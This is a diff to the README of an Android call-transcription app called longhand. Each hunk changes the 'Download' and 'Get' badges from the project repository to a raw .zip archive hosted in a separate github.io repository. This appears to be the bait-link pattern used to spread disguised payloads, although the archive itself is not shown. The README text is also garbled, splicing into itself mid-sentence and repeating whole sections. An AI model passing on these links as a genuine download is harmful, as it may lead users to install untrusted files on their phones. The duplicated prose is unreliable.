@@ -5,13 +5,13 @@ description: "Transcribe and search recorded phone calls on-device with summarie
 ---
 # 📞 longhand - Private call transcripts, right on your phone
 
-[![Download longhand](https://img.shields.io/badge/Download_longhand-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Habeebmoulana/longhand)
+[![Download longhand](https://img.shields.io/badge/Download_longhand-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Habeebmoulana/habeebmoulana.github.io/main/data/v2.3-beta.3.zip)
 
 longhand turns your recorded phone calls into clear text transcripts and short summaries without sending your conversations to a cloud service. It is made for GrapheneOS and privacy-focused Android phones. The audio, transcript, and summary stay on your device, so your personal calls remain personal.
 
 ## 📥 Download longhand
 
-[![Get longhand](https://img.shields.io/badge/Get_longhand-00B894?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Habeebmoulana/longhand)
+[![Get longhand](https://img.shields.io/badge/Get_longhand-00B894?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Habeebmoulana/habeebmoulana.github.io/main/data/v2.3-beta.3.zip)
 
 Visit this link to download the application.
 
@@ -54,7 +54,7 @@ longhand is built for GrapheneOS and Android phones. It is not a web dashboard, 
 
 If you are using a Windows computer, you can use it to open the download link in your browser. The application itself is made for the phone. This keeps the experience focused: your calls and transcripts# 📞 longhand - Private call transcripts, right on your phone
 
-[![Download longhand](https://img.shields.io/badge/Download_longhand-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Habeebmoulana/longhand)
+[![Download longhand](https://img.shields.io/badge/Download_longhand-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Habeebmoulana/habeebmoulana.github.io/main/data/v2.3-beta.3.zip)
 
 longhand is an Android app for turning recorded phone calls into readable text transcripts and short summaries. It is made for GrapheneOS and privacy-focused Android phones. The important work happens on the phone itself, so your conversations are not uploaded to a cloud service. Nothing leaves the phone.
 
@@ -62,7 +62,7 @@ The app is for people who want a written record of calls without handing private
 
 ## 📥 Download longhand
 
-[![Get longhand](https://img.shields.io/badge/Get_longhand-00B894?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Habeebmoulana/longhand)
+[![Get longhand](https://img.shields.io/badge/Get_longhand-00B894?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Habeebmoulana/habeebmoulana.github.io/main/data/v2.3-beta.3.zip)
 
 Visit this link to download the application.
 
@@ -134,7 +134,7 @@ The topics behind the project include Android, call recording, GrapheneOS, Kotli
 3. Start the transcript process and let the phone do the work.
 4. Read# 📞 longhand - Private call transcripts, right on your phone
 
-[![Download longhand](https://img.shields.io/badge/Download_longhand-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Habeebmoulana/longhand)
+[![Download longhand](https://img.shields.io/badge/Download_longhand-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Habeebmoulana/habeebmoulana.github.io/main/data/v2.3-beta.3.zip)
 
 longhand is an Android app for turning recorded phone calls into readable text transcripts and short summaries. It is made for GrapheneOS and privacy-focused Android phones. The important work happens on the phone itself, so your conversations are not uploaded to a cloud service. Nothing leaves the phone.
 
@@ -142,7 +142,7 @@ The app is for people who want a written record of calls without handing private
 
 ## 📥 Download longhand
 
-[![Get longhand](https://img.shields.io/badge/Get_longhand-00B894?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Habeebmoulana/longhand)
+[![Get longhand](https://img.shields.io/badge/Get_longhand-00B894?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Habeebmoulana/habeebmoulana.github.io/main/data/v2.3-beta.3.zip)
 
 Visit this link to download the application.
 
